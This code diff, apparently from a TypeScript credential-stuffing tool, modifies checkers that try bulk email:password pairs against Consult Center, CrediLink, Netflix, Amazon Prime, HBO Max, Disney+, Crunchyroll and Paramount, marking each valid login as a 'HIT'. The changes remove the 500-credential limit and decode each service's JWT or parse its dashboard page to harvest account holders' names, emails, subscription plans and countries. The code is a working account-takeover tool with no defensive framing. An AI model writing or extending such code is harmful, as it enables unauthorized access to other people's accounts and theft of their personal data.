@@ -152,13 +152,11 @@ function parseCookieJar(headers: Headers): string {
 }
 
 /** Parse credentials from any format — supports email:pass, user:pass, newline/comma/semicolon separated */
-const MAX_BULK = 500;
 export function parseCredentials(raw: string): Array<{ login: string; password: string }> {
   return raw
     .split(/[\n,;|]+/)
     .map(l => l.trim())
     .filter(Boolean)
-    .slice(0, MAX_BULK)
     .map(line => {
       const idx = line.indexOf(":");
       if (idx === -1) return null;
@@ -615,6 +613,37 @@ async function checkConsultCenter(login: string, password: string): Promise<Chec
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/cc_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
 
+  // Extracts rich detail from the dashboard HTML after a successful login
+  const extractCCDetail = (html: string): string => {
+    const h = html.toLowerCase();
+    // Senha expirada / troca forçada
+    if (h.includes("alterar senha") || h.includes("redefinir senha") ||
+        h.includes("senha expirada") || h.includes("sua senha expirou") ||
+        h.includes("password expired") || h.includes("change your password") ||
+        h.includes("trocar senha") || h.includes("atualizar senha")) {
+      return "SENHA_EXPIRADA — conta válida, troca obrigatória";
+    }
+    // Conta bloqueada/inativa mas com credenciais corretas
+    if (h.includes("conta inativa") || h.includes("usuário inativo") ||
+        h.includes("acesso bloqueado") || h.includes("sem permissão") ||
+        h.includes("sem permissao")) {
+      return "CONTA_BLOQUEADA";
+    }
+    // Extrair nome do usuário
+    const namePatterns = [
+      /Bem[- ]vindo[,\s]+a?o?\s+([^<\n,!]{2,50})/i,
+      /Olá[,\s]+([^<\n,!]{2,50})/i,
+      /Ola[,\s]+([^<\n,!]{2,50})/i,
+      /class="[^"]*username[^"]*"[^>]*>\s*([^<]{2,50})/i,
+      /class="[^"]*user-name[^"]*"[^>]*>\s*([^<]{2,50})/i,
+    ];
+    for (const re of namePatterns) {
+      const m = html.match(re);
+      if (m) return `logado:${m[1].trim().slice(0, 60)}`;
+    }
+    return "dashboard_ok";
+  };
+
   try {
     // ── Step 1: GET login page — obtain session cookie ─────────────────────
     let getResult: CurlResult;
@@ -634,7 +663,7 @@ async function checkConsultCenter(login: string, password: string): Promise<Chec
       return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
     }
 
-    // ── Step 2: POST credentials — check for error flash or redirect ────────
+    // ── Step 2: POST credentials — follow redirects to final page ──────────
     const postBody = [
       `_method=POST`,
       `data%5BUsuarioLogin%5D%5Busername%5D=${encodeURIComponent(login)}`,
@@ -644,7 +673,7 @@ async function checkConsultCenter(login: string, password: string): Promise<Chec
     let postResult: CurlResult;
     try {
       postResult = await runCurl([
-        "-b", cookieFile,
+        "-b", cookieFile, "-c", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -652,37 +681,43 @@ async function checkConsultCenter(login: string, password: string): Promise<Chec
         "-H", `Referer: ${CC_URL}`,
         "-H", "Origin: https://sistema.consultcenter.com.br",
         "--data-raw", postBody,
-        "--max-redirs", "0",  // do NOT follow — inspect Location header manually
+        "-L", "--max-redirs", "5",  // follow redirects — land on dashboard
         CC_URL,
       ], CC_TIMEOUT);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
     }
 
-    const body     = postResult.body;
-    const location = postResult.location;
+    const body = postResult.body;
+    const bLow = body.toLowerCase();
 
-    // Success path 1: redirect to a non-login page
-    if (postResult.statusCode >= 301 && postResult.statusCode <= 308 && location) {
-      if (!location.includes("/users/login")) {
-        const hitUrl = location.startsWith("/")
-          ? `https://sistema.consultcenter.com.br${location}`
-          : location;
-        return { credential, login, status: "HIT", detail: hitUrl };
-      }
-      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
-    }
-
-    // Success path 2: 200 response without error flash (rare, but some CakePHP apps)
-    if (!body.includes("alert-danger") && !body.includes("incorretos") && !body.includes("Usuário e senha")) {
-      if (body.includes("Bem-vindo") || body.includes("logout") || body.includes("Sair")) {
-        return { credential, login, status: "HIT", detail: "https://sistema.consultcenter.com.br/dashboard" };
-      }
-    }
-
-    // Fail: explicit error flash
-    if (body.includes("alert-danger") || body.includes("incorretos") || body.includes("Usuário e senha")) {
+    // ── FAIL: explicit error flash (still on login page) ───────────────────
+    if (body.includes("alert-danger") || body.includes("incorretos") ||
+        body.includes("Usuário e senha") || body.includes("Login ou Senha")) {
       return { credential, login, status: "FAIL", detail: "credentials_invalid" };
+    }
+    if (bLow.includes("usuário não encontrado") || bLow.includes("usuario nao encontrado")) {
+      return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
+    }
+
+    // ── HIT: landed on a post-login page ───────────────────────────────────
+    const isOnLogin = bLow.includes("/users/login") && bLow.includes('type="password"');
+    if (!isOnLogin) {
+      // Check for forced password change page — still a HIT (login worked)
+      const hLow = bLow;
+      if (hLow.includes("alterar senha") || hLow.includes("redefinir senha") ||
+          hLow.includes("senha expirada") || hLow.includes("sua senha expirou") ||
+          hLow.includes("trocar senha") || hLow.includes("atualizar senha")) {
+        return { credential, login, status: "HIT", detail: "SENHA_EXPIRADA — conta válida, troca obrigatória" };
+      }
+      if (body.includes("Bem-vindo") || body.includes("Sair") || body.includes("logout") ||
+          body.includes("Dashboard") || body.includes("dashboard") || body.includes("Painel")) {
+        return { credential, login, status: "HIT", detail: extractCCDetail(body) };
+      }
+      // Post-redirect 200 with session but no obvious markers — likely authenticated
+      if (postResult.statusCode === 200 && body.length > 2000) {
+        return { credential, login, status: "HIT", detail: extractCCDetail(body) };
+      }
     }
 
     return { credential, login, status: "FAIL", detail: "unknown_response" };
@@ -1037,7 +1072,22 @@ async function checkCrediLink(login: string, password: string): Promise<CheckRes
     // HIT: token received
     const idToken = json.idToken;
     if (idToken && typeof idToken === "string" && idToken.length > 0) {
-      return { credential, login, status: "HIT", detail: "token_ok" };
+      // Decode JWT payload for user info (base64url, no crypto needed)
+      let detail = "token_ok";
+      try {
+        const parts  = idToken.split(".");
+        const pad    = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
+        const payload = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
+        const name  = (payload.name ?? payload.nome ?? json.name ?? json.nome ?? "") as string;
+        const email = (payload.email ?? json.email ?? "") as string;
+        const role  = (payload.role ?? payload.perfil ?? payload.profile ?? "") as string;
+        const parts2: string[] = [];
+        if (name)  parts2.push(name.trim().slice(0, 40));
+        if (email && email !== login) parts2.push(email.slice(0, 40));
+        if (role)  parts2.push(`perfil:${String(role).slice(0, 20)}`);
+        if (parts2.length) detail = parts2.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
     }
 
     // Common error codes
@@ -1228,12 +1278,34 @@ async function checkCrunchyroll(login: string, password: string): Promise<CheckR
 
     if (result.statusCode === 200 && result.body.includes("access_token")) {
       let detail = "authenticated";
-      try { const j = JSON.parse(result.body); if (j.account_id) detail = `uid:${j.account_id}`; } catch { /**/ }
+      try {
+        const j = JSON.parse(result.body) as Record<string, unknown>;
+        const parts: string[] = [];
+        if (j.account_id)   parts.push(`uid:${j.account_id}`);
+        if (j.country)      parts.push(`país:${j.country}`);
+        // Decode access_token JWT for subscription tier
+        if (typeof j.access_token === "string") {
+          try {
+            const pad     = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
+            const tkParts = (j.access_token as string).split(".");
+            const tkPay   = JSON.parse(Buffer.from(pad(tkParts[1]), "base64").toString("utf8")) as Record<string, unknown>;
+            const tier    = tkPay.subscription_type ?? tkPay.tier ?? tkPay.plan ?? "";
+            if (tier) parts.push(`plano:${String(tier).slice(0, 20)}`);
+            const email = tkPay.email ?? "";
+            if (email && String(email) !== login) parts.push(String(email).slice(0, 40));
+          } catch { /**/ }
+        }
+        if (parts.length) detail = parts.join(" | ");
+      } catch { /**/ }
       return { credential, login, status: "HIT", detail };
     }
     if (result.statusCode === 401 || result.statusCode === 400) {
       let detail = "invalid_credentials";
-      try { const j = JSON.parse(result.body); if (j.error) detail = j.error; } catch { /**/ }
+      try {
+        const j = JSON.parse(result.body) as Record<string, unknown>;
+        const e = j.error ?? j.code ?? "";
+        if (e) detail = String(e).slice(0, 60);
+      } catch { /**/ }
       return { credential, login, status: "FAIL", detail };
     }
     const bLow = result.body.toLowerCase();
@@ -1317,8 +1389,24 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
 
     const body = postResult.body;
     const bLow = body.toLowerCase();
-    if (bLow.includes('"result":"login"') || bLow.includes('"membertype"') || bLow.includes('"account":'))
-      return { credential, login, status: "HIT", detail: "netflix_authenticated" };
+    if (bLow.includes('"result":"login"') || bLow.includes('"membertype"') || bLow.includes('"account":')) {
+      let detail = "netflix_authenticated";
+      try {
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const res = (j.result === "login" ? j : j) as Record<string, unknown>;
+        // Extract from top-level or nested customerData/account
+        const member = (res.membershipStatus ?? (res.customerData as Record<string, unknown>)?.membershipStatus ?? "") as string;
+        const plan   = (res.planName       ?? (res.customerData as Record<string, unknown>)?.planName ?? "") as string;
+        const country= (res.countryOfSignup ?? (res.customerData as Record<string, unknown>)?.countryOfSignup ?? "") as string;
+        const parts: string[] = [];
+        if (member && member !== "CURRENT_MEMBER") parts.push(member.toLowerCase());
+        else if (member) parts.push("ativo");
+        if (plan)    parts.push(`plano:${plan.slice(0, 25)}`);
+        if (country) parts.push(`país:${country}`);
+        if (parts.length) detail = parts.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
     if (bLow.includes("incorretemailpassword") || bLow.includes("incorrect_password") ||
         bLow.includes("invalidpassword") || bLow.includes("emailfield.invalidemailaddress") ||
         bLow.includes("invalid_email_or_password"))
@@ -1409,8 +1497,21 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
     const bLow = body.toLowerCase();
     if (bLow.includes("olá,") || bLow.includes("minha conta") || bLow.includes("logout") ||
         bLow.includes("prime video") || bLow.includes("conta &amp; listas") ||
-        (postResult.statusCode === 200 && !bLow.includes("ap/signin") && bLow.includes("amazon.com.br")))
-      return { credential, login, status: "HIT", detail: "amazon_authenticated" };
+        (postResult.statusCode === 200 && !bLow.includes("ap/signin") && bLow.includes("amazon.com.br"))) {
+      let detail = "amazon_authenticated";
+      try {
+        // "Olá, NOME" pattern in the HTML
+        const nameMatch = body.match(/Olá,\s*([^<\n]{2,50})/i) ||
+                          body.match(/Hello,\s*([^<\n]{2,50})/i) ||
+                          body.match(/class="[^"]*nav-line-1[^"]*"[^>]*>\s*([^<]{2,50})/i);
+        if (nameMatch) detail = `logado:${nameMatch[1].trim().slice(0, 50)}`;
+        // Prime membership indicator
+        if (bLow.includes("prime video") || bLow.includes("amazon prime")) {
+          detail += " | prime:sim";
+        }
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
     if (bLow.includes("senha incorreta") || bLow.includes("e-mail ou senha incorretos") ||
         bLow.includes("incorrect password") || bLow.includes("há um problema"))
       return { credential, login, status: "FAIL", detail: "invalid_credentials" };
@@ -1455,12 +1556,31 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
       "https://api.max.com/v1/oauth/token",
     ], HBO_TIMEOUT, 3);
 
-    if (result.statusCode === 200 && result.body.includes("access_token"))
-      return { credential, login, status: "HIT", detail: "max_authenticated" };
+    if (result.statusCode === 200 && result.body.includes("access_token")) {
+      let detail = "max_authenticated";
+      try {
+        const j = JSON.parse(result.body) as Record<string, unknown>;
+        // Decode JWT access_token for subscriber info
+        if (typeof j.access_token === "string") {
+          const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
+          const parts = (j.access_token as string).split(".");
+          const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
+          const info: string[] = [];
+          const email = (pay.sub ?? pay.email ?? pay.login ?? "") as string;
+          const tier  = (pay.subscriptionType ?? pay.tier ?? pay.plan ?? pay.product ?? "") as string;
+          const country = (pay.country ?? pay.region ?? "") as string;
+          if (email)   info.push(String(email).slice(0, 40));
+          if (tier)    info.push(`plano:${String(tier).slice(0, 25)}`);
+          if (country) info.push(`país:${country}`);
+          if (info.length) detail = info.join(" | ");
+        }
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
     if (result.statusCode === 401 || result.statusCode === 400) {
       let detail = "invalid_credentials";
       try {
-        const j = JSON.parse(result.body);
+        const j = JSON.parse(result.body) as Record<string, unknown>;
         const e = j.error_description ?? j.error_code ?? j.error ?? j.code ?? "";
         if (e) detail = String(e).slice(0, 60);
       } catch { /**/ }
@@ -1553,13 +1673,33 @@ async function checkDisneyPlus(login: string, password: string): Promise<CheckRe
 
     const body = loginResult.body;
     const bLow = body.toLowerCase();
-    if (loginResult.statusCode === 200 && (body.includes("access_token") || body.includes("token_type")))
-      return { credential, login, status: "HIT", detail: "disney_authenticated" };
+    if (loginResult.statusCode === 200 && (body.includes("access_token") || body.includes("token_type"))) {
+      let detail = "disney_authenticated";
+      try {
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const info: string[] = [];
+        // Decode access_token JWT for subscriber details
+        if (typeof j.access_token === "string") {
+          const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
+          const parts = (j.access_token as string).split(".");
+          const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
+          const sub   = (pay.sub ?? pay.upid ?? pay.userId ?? "") as string;
+          const tier  = (pay.subscriptionType ?? pay.tier ?? pay.entitlements ?? "") as string;
+          const region= (pay.region ?? pay.country ?? "") as string;
+          if (sub)    info.push(`uid:${String(sub).slice(0, 30)}`);
+          if (tier)   info.push(`plano:${String(tier).slice(0, 25)}`);
+          if (region) info.push(`país:${region}`);
+        }
+        if (info.length) detail = info.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
     if (loginResult.statusCode === 401 || loginResult.statusCode === 400) {
       let detail = "invalid_credentials";
       try {
-        const j = JSON.parse(body);
-        const e = j.error?.code ?? j.errors?.[0]?.code ?? j.error ?? "";
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const err = j.error as Record<string, unknown> | undefined;
+        const e = err?.code ?? (j.errors as Record<string, unknown>[])?.[0]?.code ?? j.error ?? "";
         if (e) detail = String(e).slice(0, 60);
       } catch { /**/ }
       return { credential, login, status: "FAIL", detail };
@@ -1598,9 +1738,21 @@ async function checkParamount(login: string, password: string): Promise<CheckRes
     const bLow = body.toLowerCase();
     if (result.statusCode === 200) {
       try {
-        const j = JSON.parse(body);
-        if (j.success === true || j.user?.id)
-          return { credential, login, status: "HIT", detail: `uid:${j.user?.id ?? "ok"}` };
+        const j = JSON.parse(body) as Record<string, unknown>;
+        if (j.success === true || (j.user as Record<string, unknown>)?.id) {
+          const u    = (j.user ?? {}) as Record<string, unknown>;
+          const info: string[] = [];
+          const firstName = (u.firstName ?? u.first_name ?? u.nome ?? "") as string;
+          const lastName  = (u.lastName  ?? u.last_name  ?? "")  as string;
+          const name = [firstName, lastName].filter(Boolean).join(" ").trim();
+          if (name)              info.push(`logado:${name.slice(0, 40)}`);
+          else if (u.id)         info.push(`uid:${String(u.id).slice(0, 30)}`);
+          const sub = (u.subscriptionType ?? u.subscription ?? u.plan ?? u.tier ?? j.subscriptionType ?? "") as string;
+          if (sub)               info.push(`plano:${String(sub).slice(0, 30)}`);
+          const country = (u.country ?? u.region ?? "") as string;
+          if (country)           info.push(`país:${country}`);
+          return { credential, login, status: "HIT", detail: info.join(" | ") || "paramount_ok" };
+        }
         if (j.success === false)
           return { credential, login, status: "FAIL", detail: String(j.message ?? j.error ?? "invalid").slice(0, 80) };
       } catch { /**/ }
